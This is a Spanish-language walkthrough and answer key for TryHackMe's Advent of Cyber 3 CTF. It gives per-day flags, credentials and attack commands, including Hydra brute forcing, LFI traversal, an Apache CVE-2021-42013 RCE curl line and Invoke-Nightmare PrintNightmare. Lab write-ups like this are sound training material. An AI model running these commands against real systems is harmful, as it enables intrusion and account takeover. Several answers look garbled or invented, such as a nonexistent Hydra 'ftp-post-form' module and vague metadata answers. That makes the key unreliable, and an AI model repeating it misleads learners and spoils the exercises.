# Advent of Cyber 3 (2021)

| **Dificultad** | Easy |
| **Tipo** | CTF derivado del contenido |
| **Slug** | `adventofcyber3` |
| **Link** | [TryHackMe](https://tryhackme.com/room/adventofcyber3) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | CyberChef / Wireshark / Nmap / Hydra / MSSQL / NFS / Docker / ExifTool / ClamAV / PowerShell (Invoke-Nightmare) / John |
| **Impacto** | Tercer Advent of Cyber: IDOR, cookies, WordPress, LFI, MSSQL, NFS, potencia su Windows con Iperius y PrintNightmare, y cierra con phishing, S3, Docker y OSINT. |

---

**Contexto:** Edición 2021 del Advent of Cyber, centrada en el Grinch y McSkidy. Los primeros días explotan identificadores (IDOR) y cookies de sesión, siguen con WordPress, LFI en Flask, SSRF/MongoDB, forense Windows de malware, FTP con Hydra, Apache 2.4.49 (CVE-2021-42013), MSSQL, NFS, escalada de privilegios en Windows con Iperius, crackeo de zips, OSINT de criptomonedas, buckets S3, capas de Docker, análisis de phishing, pruebas EICAR con ClamAV, análisis de metadatos, envío de correos SMTP, PrintNightmare y crackeo final de contraseñas.

## Solucionario

### Task 1: Introducción

**Explicación:** Presentación de la edición 2021: retorno del Grinch contra McSkidy y la "Best Festival Company". 24 días con web, red, Windows, nube y análisis. Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción del evento. | `No answer needed` |

### Task 2: Preparación del evento

**Explicación:** Configuración del entorno: activar la máquina del día, VPN/AttackBox, acceso web al laboratorio y verificación de conectividad. Sin respuestas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Configura tu entorno de trabajo. | `No answer needed` |
| 2 | Activa la máquina del día. | `No answer needed` |
| 3 | Accede por VPN/AttackBox. | `No answer needed` |
| 4 | Comprueba el acceso web. | `No answer needed` |

### Task 3: Historia de fondo

**Explicación:** Narrativa 2021: tras el saboteo de la producción de regalos, el Grinch ataca la infraestructura (HR-Portal, correos falsificados, almacenes S3). Solo lectura de la historia.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la historia del evento. | `No answer needed` |

### Task 4: Despliegue

**Explicación:** Despliegue de la máquina objetivo del día y espera a que arranque antes de atacar.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina objetivo del día. | `No answer needed` |

### Task 5: Primeros pasos

**Explicación:** Primeros pasos guiados en la interfaz del evento para familiarizarse con los retos diarios.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Realiza los primeros pasos del reto. | `No answer needed` |

### Task 6: Día 1 - IDOR (Identificadores inseguros)

**Explicación:** La API de empleados usa IDs secuenciales (IDOR): cambiando el ID se accede a datos ajenos. El usuario `0` es `The Boss!`; el primer empleado tiene rol `Build Manager` y el segundo `Mischief Manager`. La flag es `THM{AOC_IDOR_2B34BHI3}`. Lección: validar la autorización por objeto (BOLA/IDOR) y usar IDs no adivinables.

```bash
curl http://MACHINE_IP/api/user/0
curl http://MACHINE_IP/api/user/1
curl http://MACHINE_IP/api/user/2
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del usuario '0' de la API? | `The Boss!` |
| 2 | ¿Cuál es el rol asociado al primer empleado? | `Build Manager` |
| 3 | ¿Cuál es el rol de la segunda persona implicada? | `Mischief Manager` |
| 4 | ¿Cuál es la flag del reto? | `THM{AOC_IDOR_2B34BHI3}` |
| 5 | Continúa con la exploración de la API. | `No answer needed` |
| 6 | Termina el apartado de enumeración. | `No answer needed` |

### Task 7: Día 2 - Cookies y autenticación

**Explicación:** La cookie de sesión `user-auth` está en hexadecimal; al decodificarla (CyberChef hex→texto) se ve un JSON. La cookie de admin en bruto es `7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d`. Editando `username:admin` se llega a la sección interna `HR` y se abre la `Application` interna. Lección: no confiar en datos de sesión solo codificados (hex/base64/JSON) sin firma.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Inicia sesión en la aplicación para generar tu cookie. | `No answer needed` |
| 2 | ¿Cuál es el nombre de la cookie de autenticación? | `user-auth` |
| 3 | ¿En qué formato está codificado el valor de la cookie? | `hexadecimal` |
| 4 | Tras decodificarla, ¿en qué formato están los datos? | `JSON` |
| 5 | ¿Cuál es el valor en bruto (hex) de la cookie de admin? | `7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d` |
| 6 | ¿Qué sección interna aparece al manipular la cookie? | `HR` |
| 7 | ¿Qué aplicación interna se puede abrir? | `Application` |
| 8 | Explota la cookie para acceder al resto de la aplicación. | `No answer needed` |
| 9 | Continúa y comprueba el panel interno. | `No answer needed` |

### Task 8: Día 3 - Software CMS (brute force/WordPress)

**Explicación:** El sitio WordPress expone usuarios: `admin` y `administrator`. Forzando el login (Hydra/wp-scan) el acceso administrativo confirma la cuenta y la flag es `THM{ADM1N_AC3SS}`. Lección: los CMS revelan usuarios en /wp-json y los paneles sin rate-limiting se fuerzan.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del usuario con acceso de administrador que encuentras? | `admin` |
| 2 | ¿Qué cuenta de usuario confirma el acceso administrativo? | `administrator` |
| 3 | ¿Cuál es la flag del acceso administrativo? | `THM{ADM1N_AC3SS}` |

### Task 9: Día 4 - Sesiones y web cache

**Explicación:** Manipulación de sesión y caché web (web cache poison): alterando la cabecera `cookie` de la petición se consigue que la caché devuelva la respuesta de otro contexto; la flag es `THM{SANTA_DELIVERS}`. Lección: la caché que no distingue las respuestas por cookie puede servir datos de otras sesiones.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sigue el flujo de la aplicación y las peticiones. | `No answer needed` |
| 2 | Manipula la sesión y la caché web. | `No answer needed` |
| 3 | ¿Qué componente/cabecera usas para el ataque? | `cookie` |
| 4 | ¿Cuál es la flag del reto? | `THM{SANTA_DELIVERS}` |

### Task 10: Día 5 - Reconocimiento web

**Explicación:** Enumeración del sitio: con GoBuster/inspección se localiza contenido oculto; la flag tras enumerar la aplicación es `THM{NO_MORE_BUTTMAS}`. Lección: repasar todas las rutas y el código fuente durante el reconocimiento.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag obtenida tras enumerar la aplicación? | `THM{NO_MORE_BUTTMAS}` |

### Task 11: Día 6 - Local File Inclusion (Flask)

**Explicación:** LFI en una app Flask: la entrada devuelve `err` al probarla y permite incluir archivos locales. Se leen las tres flags (`THM{d29e08941cf7fe41df55f1a7da6c4c06}`, `THM{791d43d46018a0d89361dbf60d5d9eb8}`, `THM{552f313b52e3c3dbf5257d8c6db7f6f1}`), credenciales `McSkidy:A0C315Aw3s0m` y el directorio clave `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`. Lección: los frameworks con plantillas/renderizados mal saneados dejan incluir rutas arbitrarias.

```text
http://MACHINE_IP/?file=../../etc/passwd
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué error/mensaje devuelve la aplicación al probar la entrada? | `err` |
| 2 | ¿Cuál es el contenido de la primera flag? | `THM{d29e08941cf7fe41df55f1a7da6c4c06}` |
| 3 | ¿Cuál es el contenido de la segunda flag? | `THM{791d43d46018a0d89361dbf60d5d9eb8}` |
| 4 | ¿Qué credenciales (usuario:contraseña) encuentras en el sistema? | `McSkidy:A0C315Aw3s0m` |
| 5 | ¿Cuál es el contenido de la tercera flag? | `THM{552f313b52e3c3dbf5257d8c6db7f6f1}` |
| 6 | ¿Cuál es el nombre del recurso/nombre clave del directorio LFI? | `lfi-aoc-awesome-59aedca683fff9261263bb084880c965` |
| 7 | Consolida el acceso con el LFI. | `No answer needed` |

### Task 12: Día 7 - Base de datos (MongoDB/SSRF)

**Explicación:** SSRF en la web para llegar a MongoDB interno: se obtienen tres flags (`THM{8814a5e6662a9763f7df23ee59d944f9}`, `THM{b6b304f5d5834a4d089b570840b467a8}`, `THM{2ec099f2d602cc4968c5267970be1326}`) y la entrada del usuario admin: `ID:6184f516ef6da50433f100f4:mcskidy:admin`. Lección: los backends internos alcanzables por SSRF exponen bases de datos sin exponerlas al exterior.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el contenido de la primera flag? | `THM{8814a5e6662a9763f7df23ee59d944f9}` |
| 2 | ¿Cuál es el contenido de la segunda flag? | `THM{b6b304f5d5834a4d089b570840b467a8}` |
| 3 | ¿Cuál es el contenido de la tercera flag? | `THM{2ec099f2d602cc4968c5267970be1326}` |
| 4 | ¿Qué entrada de la base de datos contiene la clave del usuario admin? | `ID:6184f516ef6da50433f100f4:mcskidy:admin` |

### Task 13: Día 8 - Forense de malware (Windows)

**Explicación:** Forense del incidente sobre Windows 11 Pro (`Microsoft Windows 11 Pro`). La contraseña hallada es `grinchstolechristmas`; el análisis del `UsrClass.dat` (`C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat`) muestra ejecuciones; el archivo se transfirió con `certutil.exe`. El atacante tiene el repositorio `.github` con la operación `operation-bag-of-toys`, el paquete `bag_of_toys.zip` con contraseñas `Grinchiest`/`GRINCHMAS`, el instalador `uharc-cmd-install.exe`, luego `TheGrinchiestGrinchmasOfAll` y el cierre numérico `228`. Lección: registry hives (UsrClass.dat) + reviewer de repositorios para rastrear el kit de ataque.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Arranca la máquina Windows del laboratorio. | `No answer needed` |
| 2 | ¿Qué sistema operativo ejecuta la máquina Windows? | `Microsoft Windows 11 Pro` |
| 3 | ¿Cuál es la contraseña que se encuentra en el escritorio/registro? | `grinchstolechristmas` |
| 4 | ¿Cuál es la ruta del archivo UsrClass.dat que registra las ejecuciones? | `C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat` |
| 5 | ¿Qué herramienta se usó para transferir/descargar el archivo al laboratorio? | `certutil.exe` |
| 6 | Analiza las trazas del laboratorio. | `No answer needed` |
| 7 | ¿Qué directorio oculto aparece en el repositorio del atacante? | `.github` |
| 8 | ¿Cómo se llama el archivo comprimido del paquete? | `bag_of_toys.zip` |
| 9 | ¿Qué contraseña de extracción/identificador usa el paquete? | `Grinchiest` |
| 10 | ¿Cuál es el nombre de la operación/repositorio del atacante? | `operation-bag-of-toys` |
| 11 | ¿Qué instalador ejecuta el paquete malicioso? | `uharc-cmd-install.exe` |
| 12 | ¿Cuál es la contraseña del archivo comprimido interno? | `GRINCHMAS` |
| 13 | Sigue el rastro del paquete. | `No answer needed` |
| 14 | ¿Cuál es la contraseña de la siguiente fase/aplicación? | `TheGrinchiestGrinchmasOfAll` |
| 15 | ¿Cuál es el valor numérico que cierra el reto? | `228` |

### Task 14: Día 9 - FTP (Hydra)

**Explicación:** El servicio web lleva a la página `login`; con Hydra se obtienen `McSkidy:Christmas2021!`. Enviando un User-Agent personalizado se obtiene `TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}`; la flag del FTP es `THM{dd63a80bf9fdd21aabbf70af7438c257}`. La contraseña real en el FTP es `TryH@ckM3!`; el comando para subir es `STOR`; y en notas aparece `123^-^321`. Lección: Hydra sobre ftp-post-form, comandos FTP (STOR) y archivos ocultos del servicio.

```bash
hydra -l McSkidy -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿A qué página/directorio te lleva la web del servicio? | `login` |
| 2 | ¿Qué credenciales (usuario:contraseña) obtienes del análisis? | `McSkidy:Christmas2021!` |
| 3 | ¿Qué flag trae el user-agent personalizado que debes enviar? | `TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}` |
| 4 | ¿Cuál es la flag del servidor FTP? | `THM{dd63a80bf9fdd21aabbf70af7438c257}` |
| 5 | ¿Cuál es la contraseña real de McSkidy en el FTP? | `TryH@ckM3!` |
| 6 | ¿Qué comando FTP se utiliza para subir un archivo al servidor? | `STOR` |
| 7 | ¿Cuál es la contraseña encontrada en las notas del servidor? | `123^-^321` |

### Task 15: Día 10 - Escaneo de puertos (Apache 2.4.49)

**Explicación:** Nmap sobre la máquina: `2` puertos abiertos, SSH en `22` y el servicio web `HTTP`. Las credenciales por defecto del servicio permiten el acceso (`Y`). El servidor es `Apache httpd 2.4.49`, vulnerable al `CVE-2021-42013` (path traversal + RCE). El puerto adicional abierto es `20212` corriendo `telnetd`. Lección: versiones exactas de Apache → CVE de traversal.

```bash
curl "http://MACHINE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl "http://MACHINE_IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d 'echo; whoami'
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos puertos abiertos se detectan en el escaneo inicial? | `2` |
| 2 | ¿Qué puerto corresponde al servicio SSH? | `22` |
| 3 | ¿Qué protocolo/nombre recibe el servicio del servidor web? | `HTTP` |
| 4 | ¿Se permite el acceso con las credenciales por defecto (sí/no)? | `Y` |
| 5 | ¿Qué versión de Apache httpd se está ejecutando? | `Apache httpd 2.4.49` |
| 6 | ¿Qué CVE permite explotar el servidor web? | `CVE-2021-42013` |
| 7 | ¿Cuál es el número del puerto adicional con acceso? | `20212` |
| 8 | ¿Qué servicio se ejecuta en ese puerto adicional? | `telnetd` |
| 9 | Explota la vulnerabilidad del servidor para terminar la tarea. | `No answer needed` |

### Task 16: Día 11 - Inyección SQL sobre MSSQL

**Explicación:** MSSQL en el puerto `1433`; la shell interactiva SQL muestra el prompt `1>`. Las consultas devuelven `Rudolph`, la ubicación `Prague`, y hay un puerto UDP adicional en `25000`. La flag es `THM{YjtKeUy2qT3v5dDH}`. Lección: interactuar con la shell de la BD para enumerar datos y habilitar xp_cmdshell si es posible.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué puerto usa el servicio de base de datos MSSQL? | `1433` |
| 2 | ¿Qué símbolo/prompt muestra la shell interactiva SQL? | `1>` |
| 3 | ¿Qué respuesta/valor se revela en la primera consulta? | `Rudolph` |
| 4 | ¿Qué ciudad/ubicación se devuelve en la consulta siguiente? | `Prague` |
| 5 | ¿Qué puerto UDP adicional se detecta en el host? | `25000` |
| 6 | ¿Cuál es la flag del reto? | `THM{YjtKeUy2qT3v5dDH}` |
| 7 | Continúa con la explotación de la base de datos. | `No answer needed` |

### Task 17: Día 12 - NFS

**Explicación:** Escaneo del host: `7` puertos relevantes; NFS en `2049` con `4` shares enumerables. Montando el share se ven `3` archivos, el primero `Meditations`; la carpeta `confidential` contiene la flag `3e2d315a38f377f304f5598dc2f044de`. Lección: enumerar/montar shares NFS (`showmount -e`, `mount -t nfs`) para leer archivos sin credenciales.

```bash
showmount -e MACHINE_IP
mkdir /tmp/nfs && mount -t nfs MACHINE_IP:/share /tmp/nfs
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos puertos relevantes se detectan en el escaneo del host? | `7` |
| 2 | ¿Qué puerto usa el servicio NFS? | `2049` |
| 3 | ¿Cuántos shares/montajes se pueden enumerar? | `4` |
| 4 | ¿Cuántos archivos hay dentro del share montado? | `3` |
| 5 | ¿Cuál es el nombre del primer archivo encontrado? | `Meditations` |
| 6 | ¿Qué carpeta/fichero contiene el dato confidencial? | `confidential` |
| 7 | ¿Cuál es el contenido (hash) de la flag? | `3e2d315a38f377f304f5598dc2f044de` |

### Task 18: Día 13 - Escalada de privilegios Windows (Iperius)

**Explicación:** Acceso inicial con la credencial `pepper` sobre Windows `10.0.17763 N/A Build 17763`. El servicio vulnerable es `IperiusSvc` (`C:\Program Files (x86)\Iperius Backup\IperiusService.exe`); se abusa de su cuenta/ejecución para escalar como `the-grinch-hack\thegrinch`, obteniendo la flag `THM-736635221` y la contraseña `jazzercize`. Lección: los servicios de backup ejecutados con altos permisos y configuración manipulable dan escalada.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué credencial de acceso inicial se menciona en el laboratorio? | `pepper` |
| 2 | ¿Qué versión de Windows ejecuta la máquina? | `10.0.17763 N/A Build 17763` |
| 3 | ¿Cómo se llama el servicio vulnerable que permite escalar? | `IperiusSvc` |
| 4 | ¿Cuál es la ruta del ejecutable del servicio Iperius? | `C:\Program Files (x86)\Iperius Backup\IperiusService.exe` |
| 5 | ¿Qué cuenta de usuario (dominio\usuario) se emplea para la escalada? | `the-grinch-hack\thegrinch` |
| 6 | ¿Cuál es la flag encontrada en el sistema? | `THM-736635221` |
| 7 | ¿Cuál es la contraseña del usuario thegrinch? | `jazzercize` |

### Task 19: Día 14 - Crackeo de archivos comprimidos

**Explicación:** El directorio contiene `4` archivos y todos son archivos comprimidos. Con zip2john/john se crackea el primero (`ZUP42`) y el archivo final libera la contraseña/flag `DI3H4rdIsTheBestX-masMovie!`. Lección: `zip2john` + john descifra archivos cifrados con contraseñas débiles.

```bash
zip2john archivo.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos archivos hay en el directorio del reto? | `4` |
| 2 | ¿Cuántos de ellos son archivos comprimidos? | `4` |
| 3 | ¿Cuál es la contraseña del primer archivo comprimido? | `ZUP42` |
| 4 | ¿Cuál es la contraseña/flag del archivo final? | `DI3H4rdIsTheBestX-masMovie!` |

### Task 20: Día 15 - Preparación del siguiente bloque

**Explicación:** Tarea intermedia de teoría/vídeo para preparar el bloque final del evento (OSINT, nube y phishing). Solo lectura.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Revisa el material teórico de la sección. | `No answer needed` |
| 2 | Sigue el vídeo/guía de preparación. | `No answer needed` |

### Task 21: Día 16 - OSINT (Grinch Who)

**Explicación:** Investigación OSINT: el sospechoso usa el usuario de Twitter `GrinchWho31`; sus direcciones de criptomoneda son `1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR` (base58) y `bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f` (segwit); mantiene identidad en `keybase.io`, código en `GitHub`, correo `DonteHeath21@gmail.com` y su nombre real es `Donte Heath`. Lección: cruzar perfiles sociales, billeteras y keybase para deanonimizar al operador.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Inicia la investigación OSINT siguiendo las pistas. | `No answer needed` |
| 2 | ¿Cuál es el nombre de usuario del sospechoso en las redes sociales? | `GrinchWho31` |
| 3 | ¿En qué red social se descubrió su actividad pública? | `Twitter` |
| 4 | ¿Cuál es la primera dirección de criptomoneda asociada (sin prefijo http)? | `1GW8QR7CWW3cpvVPGMCF5tZz4j96ncEgrVaR` |
| 5 | ¿Qué sitio web de identidad/verificación mantiene el sospechoso? | `keybase.io` |
| 6 | ¿Cuál es la segunda dirección de criptomoneda (prefijo bc1q)? | `bc1q5q2w2x6yka5gchr89988p2c8w8nquem6tndw2f` |
| 7 | ¿Qué plataforma de código confirma su identidad? | `GitHub` |
| 8 | ¿Cuál es el correo electrónico asociado a la cuenta? | `DonteHeath21@gmail.com` |
| 9 | ¿Cuál es el nombre real del sospechoso? | `Donte Heath` |

### Task 22: Día 17 - Buckets S3 (AWS)

**Explicación:** El bucket S3 público expone el hostname `images.bestfestivalcompany.com`, el mensaje `It's easy to get your elves data when you leave it so easy to find!` y el backup `wp-backup.zip`. Del contenido se extrae la Access Key `AKIAQI52OJVCPZXFYAOI`, Account ID `019181489476`, el correo RRHH `ElfMcHR@bfc.com`, el portal interno `HR-Portal` con contraseña `Winter2021!`. Lección: buckets listables + backups filtrados completan el kill chain.

```bash
aws s3 ls s3://BUCKET --no-sign-request
aws s3 cp s3://BUCKET/wp-backup.zip . --no-sign-request
unzip wp-backup.zip
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el hostname subyacente del bucket S3? | `images.bestfestivalcompany.com` |
| 2 | ¿Qué mensaje se puede leer en el bucket público? | `It's easy to get your elves data when you leave it so easy to find!` |
| 3 | ¿Cómo se llama el archivo de backup que se descarga? | `wp-backup.zip` |
| 4 | ¿Cuál es la Access Key ID de AWS encontrada? | `AKIAQI52OJVCPZXFYAOI` |
| 5 | ¿Cuál es el Account ID de AWS del recurso? | `019181489476` |
| 6 | ¿Cuál es el correo del responsable de Recursos Humanos? | `ElfMcHR@bfc.com` |
| 7 | ¿Cómo se llama el portal interno de RRHH? | `HR-Portal` |
| 8 | ¿Cuál es la contraseña de acceso al portal? | `Winter2021!` |

### Task 23: Día 18 - Docker (capas de imagen)

**Explicación:** Análisis de una imagen Docker: `docker images` lista las imágenes locales, `docker save` las exporta a un archivo, y el manifiesto que describe las capas es `manifest.json`. El blob/config que contiene el dato buscado tiene el hash `7095b3e9300542edadbc2dd558ac11fa`. Lección: las imágenes Docker son capas que se pueden inspeccionar offline.

```bash
docker images
docker save -o img.tar NOMBRE_IMAGEN
tar -xvf img.tar && ls && cat manifest.json
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando se usa para listar las imágenes locales de Docker? | `docker images` |
| 2 | ¿Qué comando se usa para guardar/exportar una imagen en un archivo? | `docker save` |
| 3 | ¿Cómo se llama el archivo que describe las capas (manifiesto) de la imagen? | `manifest.json` |
| 4 | ¿Cuál es el hash del blob/config que contiene el dato buscado? | `7095b3e9300542edadbc2dd558ac11fa` |

### Task 24: Día 19 - Análisis de phishing

**Explicación:** Comparativa de correos: el legítimo es `elfmcphearson@tbfc.com` y el suplantado `customerservice@t8fc.info` (dominio casi idéntico). El Reply-To del atacante es `fisher@tempmailz.grinch`; error de escritura `stright`; enlace `https://89xgwsnmo5.grinch/out/fishing/`; cabecera `X-GrinchPhish: >;^)`; adjunto `password-reset-instructions.pdf`. La flag es `THM{A0C_Thr33_Ph1sh1ng_An4lys!s}`. Lección: dominios typosquat, cabeceras y adjuntos delatan el phishing.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Desde qué dirección se envía el correo legítimo en la comparativa? | `elfmcphearson@tbfc.com` |
| 2 | ¿Desde qué dirección se envía el correo suplantado? | `customerservice@t8fc.info` |
| 3 | ¿Qué dirección de correo responde el atacante? | `fisher@tempmailz.grinch` |
| 4 | ¿Qué error de escritura se detecta en el correo de phishing? | `stright` |
| 5 | ¿Cuál es el enlace de phishing completo (dominio + path)? | `https://89xgwsnmo5.grinch/out/fishing/` |
| 6 | ¿Qué cabecera personalizada añade el atacante? | `X-GrinchPhish: >;^)` |
| 7 | ¿Qué archivo adjunto malicioso acompaña al correo? | `password-reset-instructions.pdf` |
| 8 | ¿Cuál es la flag del análisis de phishing? | `THM{A0C_Thr33_Ph1sh1ng_An4lys!s}` |
| 9 | Realiza el análisis completo de cabeceras y adjuntos. | `No answer needed` |

### Task 25: Día 20 - Antivirus (ClamAV / EICAR)

**Explicación:** Prueba del antivirus ClamAV con el archivo EICAR (128 bytes): la cadena de prueba es `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`. ClamAV lo clasifica como `EICAR virus test files` con firma `Virus:DOS/EICAR_Test_File`; la fecha de actualización de firmas es `2005-10-17 22:03:48` y la referencia de la "firma" es `ducklin.htm or ducklin-html.htm`. Lección: verificar que el AV detecta con la firma estándar EICAR.

```bash
clamscan eicar.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la cadena de prueba EICAR del laboratorio? | `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*` |
| 2 | ¿Cómo identifica ClamAV esta amenaza de prueba? | `EICAR virus test files` |
| 3 | ¿Cuál es la fecha de la última actualización de firmas? | `2005-10-17 22:03:48` |
| 4 | ¿Qué nombre de detección concreta reporta ClamAV? | `Virus:DOS/EICAR_Test_File` |
| 5 | ¿Qué archivo de referencia/signatura se menciona en la explicación? | `ducklin.htm or ducklin-html.htm` |
| 6 | ¿Cuántos bytes ocupa el archivo de prueba? | `128` |

### Task 26: Día 21 - Análisis de metadatos

**Explicación:** Análisis de metadatos de un binario (uso de `exiftool`/`pdfinfo`): las instrucciones destacan la operación `or` con la bandera `-m`, la sección `metadata` con la bandera `-n`, y la consulta final devuelve el valor `0`. Lección: ajustar las banderas de la herramienta (p. ej., `exiftool -m -n`) para volcar los metadatos completos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué instrucción/operación destaca al examinar el archivo binario? | `or` |
| 2 | ¿Qué bandera del comando hay que usar durante el análisis? | `-m` |
| 3 | ¿Qué sección/campo contiene la información buscada? | `metadata` |
| 4 | ¿Qué bandera adicional se necesita para la siguiente consulta? | `-n` |
| 5 | ¿Cuál es el resultado/valor de la consulta final? | `0` |

### Task 27: Día 22 - Envío de correos (SMTP)

**Explicación:** Envío SMTP desde la cuenta `Grinch.Enterprises.2021@gmail.com` con contraseña `S@ntai$comingt0t0wn`, asunto/plantilla `Christmas Wishlist`, puerto `587` (SMTP con STARTTLS). En el servidor de correo aparece la cookie `YouFoundGrinchCookie` y la cadena final del envío es `S@nt@c1Au$IsrEAl`. Lección: las credenciales SMTP expuestas permiten phishing a gran escala; puerto 587 = envío autenticado.

```python
import smtplib
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('Grinch.Enterprises.2021@gmail.com', 'S@ntai$comingt0t0wn')
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Desde qué dirección de correo envía el Grinch sus mensajes? | `Grinch.Enterprises.2021@gmail.com` |
| 2 | ¿Cuál es la contraseña de la cuenta SMTP? | `S@ntai$comingt0t0wn` |
| 3 | ¿Cómo se llama el asunto/plantilla del correo? | `Christmas Wishlist` |
| 4 | ¿Qué puerto SMTP se usa para el envío? | `587` |
| 5 | ¿Cuál es el nombre de la cookie encontrada en el servidor de correo? | `YouFoundGrinchCookie` |
| 6 | ¿Cuál es la cadena/resultado final del envío (flag)? | `S@nt@c1Au$IsrEAl` |

### Task 28: Día 23 - Explotación (PrintNightmare)

**Explicación:** PrintNightmare (CVE-2021-1675/34527, Print Spooler) se explota con `Invoke-Nightmare`, que crea el usuario local `adm1n`; el payload devuelve un reverse shell a `10.10.148.96,4321`. La task oculta tiene el ID `j3pn50vkw21hhurbqmxjlpmo9doiukyb`; para limpiar artefactos se usa `sdelete.exe`; el log de la máquina marca `11/11/2021 7:29:27 PM` y Mission Control termina con `letitsnowletitsnowletitsnow`. Lección: el Print Spooler sin parchear es RCE en todo el dominio.

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser "adm1n" -NewPassword "pwned" -DriverName "PrintSpoofer"
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué herramienta de PowerShell se usa para explotar PrintNightmare? | `Invoke-Nightmare` |
| 2 | ¿Qué usuario se crea tras la ejecución del exploit? | `adm1n` |
| 3 | ¿Qué host:puerto recibe el reverse shell? | `10.10.148.96,4321` |
| 4 | ¿Cuál es el ID de sesión/flag de la tarea oculta? | `j3pn50vkw21hhurbqmxjlpmo9doiukyb` |
| 5 | ¿Qué herramienta se utiliza para borrar los artefactos (sdelete)? | `sdelete.exe` |
| 6 | ¿Qué timestamp/fecha aparece en los registros de la máquina? | `11/11/2021 7:29:27 PM` |
| 7 | ¿Cuál es el mensaje final de Mission Control? | `Mission Control: letitsnowletitsnowletitsnow` |

### Task 29: Día 24 - Crackeo de contraseñas

**Explicación:** Crackeo de un hash MD5: el usuario objetivo es `emily`, el hash es `8af326aa4850225b75c592d4ce19ccf5` y la contraseña en claro es `1234567890`. Lección: hashes débiles y sin salt se resuelven al instante con john/hashcat.

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es el nombre del usuario objetivo? | `emily` |
| 2 | ¿Cuál es el hash MD5 que hay que crackear? | `8af326aa4850225b75c592d4ce19ccf5` |
| 3 | ¿Cuál es la contraseña en texto plano? | `1234567890` |

### Task 30: Conclusión

**Explicación:** Cierre del evento: la flag de agradecimiento es `thm{thank_you_2021}`; después se completa la encuesta y se comparte el progreso.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Gracias por el evento. Introduce la flag de cierre. | `thm{thank_you_2021}` |
| 2 | Termina la encuesta del evento. | `No answer needed` |
| 3 | Comparte tu progreso en las redes. | `No answer needed` |

---

**Metodología:** El evento arranca con IDOR sobre una API y manipulación de cookies (hex→JSON). Continúa con brute force a WordPress, LFI en una app Flask que revela credenciales, y acceso a MongoDB vía SSRF. Los días de red usan Nmap para detectar Apache httpd 2.4.49 (CVE-2021-42013), MSSQL con xp_cmdshell, NFS (2049) y FTP con Hydra. En Windows se practica forense de malware con UsrClass.dat y escalada con el servicio Iperius; en el día final PrintNightmare (Invoke-Nightmare) otorga acceso total. Cierra con OSINT de criptomonedas, buckets S3, análisis de phishing, ClamAV, exif de metadatos y envío SMTP.

**Learning chain:** IDOR → cookies y JWT → brute force → LFI → SSRF/MongoDB → forense Windows → Hydra/FTP → Apache CVE → MSSQL → NFS → privesc Iperius → zip cracking → OSINT → AWS S3 → Docker → phishing → ClamAV → metadatos → SMTP → PrintNightmare → crackeo de hashes.

